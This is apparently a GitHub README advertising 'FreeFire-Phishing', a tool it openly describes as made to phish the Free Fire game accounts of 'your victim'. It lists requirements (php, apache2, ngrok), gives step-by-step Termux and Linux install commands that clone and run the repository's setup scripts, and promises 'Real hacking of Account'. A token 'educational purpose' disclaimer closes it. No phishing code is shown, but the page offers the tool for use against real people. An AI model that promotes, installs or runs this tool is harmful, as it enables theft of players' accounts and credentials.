<h1 align="center">Free Fire Phishing - OnlineHacking</h1>
<p align="center">
  FreeFire ID Hack Use Termux
</p>
<p align="center">
<a href="https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html.html"><img title="Made in INDIA" src="https://img.shields.io/badge/MADE%20IN-INDIA-SCRIPT?colorA=%23ff8100&colorB=%23017e40&colorC=%23ff0000&style=for-the-badge"></a>
</p>

</p>
<p align="center">
<a href="https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html.html"><img title="Made in INDIA" src="https://img.shields.io/badge/Tool-FREEFIRE_PHISHING-green.svg"></a>
<a href="https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html.html"><img title="Version" src="https://img.shields.io/badge/Version-2.4-green.svg?style=flat-square"></a>
<a href="https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html.html"><img title="Maintainence" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg"></a>
</p>

<p align="center">

![unnamed (2)](https://1.bp.blogspot.com/-1wb4xEP0dRg/YEYUOrDo6PI/AAAAAAAAFR0/dVrZhurI2rIb86lwrao1gmysX2nwD2U-QCLcBGAsYHQ/s1280/500033300005_273526.jpg)

</p>


## ABOUT TOOL :

FREEFIRE-PHISING IS A PHISING TOOL WICH IS USED TO PHISH A FREEFIRE ACCOUNT OF YOUR VICTIM. This tool works on both rooted Android device and Non-rooted Android device.

### AVAILABLE ON :

* Termux App

* Kali Linux

* Parrot OS

* Ubuntu

* Arch Linux

* MAC

### TESTED ON :

* Termux App

* Kali Linux
 
* Parrot OS
 
* Ubuntu


### REQUIREMENTS :

* Fast internet

* php

* ngrok token

* apache2

### FEATURES :

* [+] Real hacking of Account !

* [+] Updated maintainence !

* [+] Custom link !

* [+] Easy for Beginners !


## ✅ INSTALLATION [ All Systems ] :

# <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/OnlineHacKing/FreeFire-Phishing&tutorial=README.md)



## ✅ INSTALLATION [ Android Termux ] :
```
pkg update -y

pkg upgrade -y

pkg install git 

git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git

cd FreeFire-Phishing

chmod +x *

bash Andriod-Setup

FreeFire-Phishing
```


## ✅ INSTALLATION [ Linux ] :
```
sudo apt update -y

sudo apt upgrade -y

sudo apt install git 

git clone https://github.com/OnlineHacKing/FreeFire-Phishing.git

cd FreeFire-Phishing

chmod +x *

bash Linux-Setup

FreeFire-Phishing
```

## ✅ INSTALLATION [ Windows ] :

# <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/OnlineHacKing/FreeFire-Phishing&tutorial=README.md)


### 📸 SCREENSHOTS [Termux]

<br>
<p align="center">
<img width="40%" src="https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/img/OnlineHacking-ff2.jpg"/>
</p>
<br>
<p align="center">
<img width="41%" src="https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/img/OnlineHacking-ff3.jpg"/>
<img width="40%" src="https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/img/OnlineHacking-ff1.jpg"/>
</p>


### WATCH VIDEO 

[![des]()](https://rebrand.ly/rcentvideo)


## 👨🏻‍💻 CONNECT WITH US :


<a href="https://github.com/OnlineHacKing"><img title="Github" src="https://img.shields.io/badge/Online-hacking-brightgreen?style=for-the-badge&logo=github"></a>
[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://www.instagram.com/suman333mondal/)
[![Instagram](https://img.shields.io/badge/WEBSITE-VISIT-yellow?style=for-the-badge&logo=blogger)](https://www.onlinehacking.xyz)
[![Instagram](https://img.shields.io/badge/LINKEDIN-CONNECT-red?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/sumam333mondal/)
[![Instagram](https://img.shields.io/badge/FACEBOOK-LIKE-red?style=for-the-badge&logo=facebook)](https://fb.com/adminonlinehacking)
[![Instagram](https://img.shields.io/badge/TELEGRAM-CHANNEL-red?style=for-the-badge&logo=telegram)](https://telegram.dog/OnlineHacking)
<a href="https://www.youtube.com/channel/UC8pmZJAlagdZ7bb0TBlogYw"><img title="YouTube" src="https://img.shields.io/badge/YouTube-Online Hacking-red?style=for-the-badge&logo=Youtube"></a>


# ■□■ ⚠ Warning ⚠ ■□■

***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***

***This information is only for educationla purpose and we are not responsible for any kind of illegal activity done by this tool***


<p style="box-sizing: border-box; color: #24292e; font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-size: 16px; margin-bottom: 16px; margin-top: 0px; text-align: center;"><a href="https://github.com/OnlineHacking/" style="background-color: initial; box-sizing: border-box; text-decoration-line: none;"><img alt="GitHub" height="110" src="https://user-images.githubusercontent.com/64035221/96459220-834c7e00-123f-11eb-8417-534058a7ba62.png" style="background-color: var(--color-bg-primary); border-style: none; box-sizing: initial; max-width: 100%;" width="110" />&nbsp;</a><a href="https://www.youtube.com/channel/UC8pmZJAlagdZ7bb0TBlogYw" rel="nofollow" style="background-color: initial; box-sizing: border-box; text-decoration-line: none;"><img alt="YouTube" height="110" src="https://user-images.githubusercontent.com/64035221/96456596-4f238e00-123c-11eb-821e-85e9aaa3faec.png" style="background-color: var(--color-bg-primary); border-style: none; box-sizing: initial; max-width: 100%;" width="110" />&nbsp;</a><a href="https://telegram.dog/OnlineHacking" rel="nofollow" style="background-color: initial; box-sizing: border-box; text-decoration-line: none;"><img alt="Telegram" height="80" src="https://user-images.githubusercontent.com/64035221/96461243-c576bf00-1241-11eb-8fdf-139b4859bfb0.png" style="background-color: var(--color-bg-primary); border-style: none; box-sizing: initial; max-width: 100%;" width="80" />&nbsp;</a><a href="https://www.instagram.com/suman333mondal/" rel="nofollow" style="background-color: initial; box-sizing: border-box; text-decoration-line: none;"><img alt="Instagram" height="90" src="https://user-images.githubusercontent.com/64035221/96461629-3d44e980-1242-11eb-8691-46dd14355085.png" style="background-color: var(--color-bg-primary); border-style: none; box-sizing: initial; max-width: 100%;" width="90" /></a></p>



                     Inspired By github.com/OnlineHacking
